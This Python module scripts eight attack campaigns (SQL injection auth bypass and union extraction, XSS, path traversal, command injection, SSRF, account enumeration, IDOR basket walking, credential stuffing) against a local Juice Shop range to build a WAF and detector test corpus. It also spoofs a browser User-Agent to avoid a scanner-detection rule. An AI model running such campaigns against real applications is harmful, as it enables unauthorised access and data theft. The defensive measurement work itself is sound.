"""Eight scripted attack campaigns against our own Juice Shop range.

Each campaign is a *progressing sequence* from a single actor -- recon first,
then enumeration/probing, then exploitation -- not a flat list of payloads.
That progression is deliberate: it is what M1's campaign detector must learn to
recognise, and it is how real intrusions actually look.

Each campaign returns a dict:
    {"objective": str, "objective_met": bool, "evidence": str}
so the baseline can report attack *success rate*, not only request block rate.

ALL requests target http://localhost:8080 (our range). These payloads are the
standard, well-documented techniques for each class, used here only against an
application we own. Nothing here touches any third-party system -- see the
"No offensive action" invariant in CLAUDE.md.

Endpoint assumptions follow OWASP Juice Shop v20's REST API. Where the app has
no vulnerable sink for a class (e.g. OS command injection), the campaign still
fires the canonical payloads so the corpus records whether CRS blocks the
*pattern*; "objective_met" will simply be False. A miss there is honest data.
"""

from __future__ import annotations

import json
import time
import urllib.parse
from pathlib import Path

from client import Actor

# --- shared payload sets ------------------------------------------------------
# Loaded from data/attack_corpus/payloads.json so the attack corpus can be
# extended without editing code. Standard, well-documented techniques used ONLY
# against our own local range.
_PAYLOADS = json.loads(
    (Path(__file__).resolve().parents[2] / "data" / "attack_corpus" / "payloads.json")
    .read_text(encoding="utf-8"))

SQLI_LOGIN = _PAYLOADS["sqli_login"]
SQLI_UNION = _PAYLOADS["sqli_union"]
XSS = _PAYLOADS["xss"]
TRAVERSAL = _PAYLOADS["traversal"]
CMDI = _PAYLOADS["cmdi"]
SSRF = _PAYLOADS["ssrf"]
CRED_LIST = [tuple(p) for p in _PAYLOADS["credentials"]]
SEED_USERS = _PAYLOADS["seed_users"]


def _recon(a: Actor) -> None:
    """Every campaign starts by looking like a normal visitor."""
    a.fire("GET", "/", stage="recon", technique="landing", malicious=False)
    a.fire("GET", "/rest/products/search", stage="recon", technique="browse",
           malicious=False, params={"q": "apple"})


def _pace(seconds: float) -> None:
    if seconds:
        time.sleep(seconds)


# --- campaigns -----------------------------------------------------------------

def sqli(a: Actor, pace: float) -> dict:
    _recon(a)
    met, evidence = False, ""
    for p in SQLI_LOGIN:
        r = a.fire("POST", "/rest/user/login", stage="exploit", technique="sqli-auth-bypass",
                   json_body={"email": p, "password": "x"}, note="login bypass")
        if r.status == 200 and "authentication" in r.body.lower():
            met, evidence = True, "auth bypass: received token via SQLi login"
        _pace(pace)
    for p in SQLI_UNION:
        r = a.fire("GET", "/rest/products/search", stage="exfil", technique="sqli-union",
                   params={"q": p}, note="union data extraction")
        if r.status == 200 and ("password" in r.body.lower() or "@" in r.body):
            met = met or True
            evidence = evidence or "union extraction returned row-like data"
        _pace(pace)
    return {"objective": "bypass auth / extract Users table", "objective_met": met,
            "evidence": evidence}


def xss(a: Actor, pace: float) -> dict:
    _recon(a)
    met = False
    for p in XSS:  # reflected via search
        r = a.fire("GET", "/rest/products/search", stage="probe", technique="xss-reflected",
                   params={"q": p})
        if r.status == 200 and "<script>alert" in r.body:
            met = True
        _pace(pace)
    # stored via a product review (needs no auth token on some versions)
    a.fire("PUT", "/rest/products/1/reviews", stage="exploit", technique="xss-stored",
           json_body={"message": XSS[0], "author": "attacker@evil.test"},
           note="stored XSS in review")
    return {"objective": "inject executing script (reflected/stored)",
            "objective_met": met, "evidence": "payload reflected unescaped" if met else ""}


def path_traversal(a: Actor, pace: float) -> dict:
    _recon(a)
    met, evidence = False, ""
    for path in TRAVERSAL:
        # Only requests that actually use a traversal technique are malicious
        # for this class. A plain GET of an exposed file (e.g. the intended
        # /ftp/package.json.bak) is a different weakness (sensitive file
        # exposure), not path traversal, and nothing in the request is
        # traversal-shaped -- labelling it malicious would be a mislabel.
        is_trav = any(tok in path.lower() for tok in ("..", "%2e", "%00", "%25"))
        r = a.fire("GET", path, stage="exploit" if is_trav else "recon",
                   technique="path-traversal" if is_trav else "file-access",
                   malicious=is_trav)
        if r.status == 200 and ("root:" in r.body or "\"name\"" in r.body):
            met, evidence = True, f"read file via {path}"
        _pace(pace)
    return {"objective": "read files outside the web root", "objective_met": met,
            "evidence": evidence}


def command_injection(a: Actor, pace: float) -> dict:
    _recon(a)
    met = False
    for p in CMDI:
        # Fire at a couple of plausible sinks; Juice Shop has no classic OS
        # cmdi sink, so expect misses -- the point is to record CRS coverage.
        a.fire("GET", "/rest/products/search", stage="probe", technique="cmdi-search",
               params={"q": "apple" + p})
        r = a.fire("POST", "/api/Feedbacks", stage="exploit", technique="cmdi-feedback",
                   json_body={"comment": "nice" + p, "rating": 3})
        if r.status == 200 and ("uid=" in r.body or "root:" in r.body):
            met = True
        _pace(pace)
    return {"objective": "execute OS commands", "objective_met": met,
            "evidence": "command output in response" if met else ""}


def ssrf(a: Actor, pace: float) -> dict:
    _recon(a)
    met = False
    for u in SSRF:
        # Juice Shop's SSRF sink: profile image URL fetch.
        r = a.fire("POST", "/profile/image/url", stage="exploit", technique="ssrf-image-url",
                   data=urllib.parse.urlencode({"imageUrl": u}).encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   note=u)
        if r.status in (200, 302) and "error" not in r.body.lower():
            met = True
        _pace(pace)
    return {"objective": "make the server fetch an internal/metadata URL",
            "objective_met": met, "evidence": "server accepted internal URL" if met else ""}


def user_enumeration(a: Actor, pace: float) -> dict:
    _recon(a)
    seen = {}
    for email in SEED_USERS:
        # Security-question lookup leaks whether an account exists.
        r = a.fire("GET", "/rest/user/security-question", stage="enumerate",
                   technique="user-enum-secq", malicious=True, params={"email": email})
        exists = r.status == 200 and r.body.strip() not in ("", "{}", "null")
        seen[email] = exists
        _pace(pace)
    met = any(seen.values())
    return {"objective": "learn which accounts exist", "objective_met": met,
            "evidence": f"accounts confirmed: {[e for e, v in seen.items() if v]}" if met else ""}


def idor_bola(a: Actor, pace: float) -> dict:
    _recon(a)
    # Authenticate as a legitimate-but-low-privilege actor first (best effort).
    r = a.fire("POST", "/rest/user/login", stage="recon", technique="login", malicious=False,
               json_body={"email": "attacker@aegis.test", "password": "Aegis!2345"})
    try:
        import json as _j
        a.token = _j.loads(r.body).get("authentication", {}).get("token")
    except Exception:
        pass
    met, found = False, []
    for bid in range(1, 8):  # walk other users' basket ids
        r = a.fire("GET", f"/rest/basket/{bid}", stage="exploit", technique="bola-basket",
                   note=f"basket {bid}")
        if r.status == 200 and "\"id\"" in r.body:
            met, _ = True, found.append(f"basket/{bid}")
        _pace(pace)
    for uid in range(1, 6):  # direct object reference to user records
        a.fire("GET", f"/api/Users/{uid}", stage="exfil", technique="idor-user",
               note=f"user {uid}")
        _pace(pace)
    return {"objective": "access other users' objects (baskets, user records)",
            "objective_met": met, "evidence": f"reachable: {found}" if found else ""}


def credential_stuffing(a: Actor, pace: float) -> dict:
    _recon(a)
    met, hits = False, []
    for email, pw in CRED_LIST:
        r = a.fire("POST", "/rest/user/login", stage="exploit", technique="cred-stuffing",
                   json_body={"email": email, "password": pw}, note=email)
        if r.status == 200 and "authentication" in r.body.lower():
            met, _ = True, hits.append(email)
        _pace(pace * 0.5)  # stuffing is faster than interactive attacks
    return {"objective": "find valid credentials by replaying leaked pairs",
            "objective_met": met, "evidence": f"valid: {hits}" if hits else ""}


CAMPAIGNS = {
    "sqli": sqli,
    "xss": xss,
    "path_traversal": path_traversal,
    "command_injection": command_injection,
    "ssrf": ssrf,
    "user_enumeration": user_enumeration,
    "idor_bola": idor_bola,
    "credential_stuffing": credential_stuffing,
}

# A readable user-agent per campaign so actor reconstruction (M1) has a signal,
# and so the attack traffic is distinguishable from the benign corpus in logs.
# A realistic browser UA. Attackers who matter spoof this; announcing yourself as
# sqlmap makes CRS block even your harmless requests (rule 913100), which
# inflates a WAF baseline. Default for all measurements.
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")


def user_agent_for(campaign: str, mode: str = "browser") -> str:
    """mode='browser' (spoofed, default) or 'tool' (announces the scanner)."""
    return BROWSER_UA if mode == "browser" else USER_AGENTS[campaign]


USER_AGENTS = {
    "sqli": "sqlmap/1.8#stable (http://sqlmap.org)",
    "xss": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 XSStrike",
    "path_traversal": "Mozilla/5.0 (compatible; Nuclei - Open-source)",
    "command_injection": "Mozilla/5.0 commix/v3.9",
    "ssrf": "Mozilla/5.0 (compatible; SSRFmap)",
    "user_enumeration": "python-requests/2.31 (aegis-enum)",
    "idor_bola": "Mozilla/5.0 (compatible; Autorize)",
    "credential_stuffing": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OpenBullet",
}
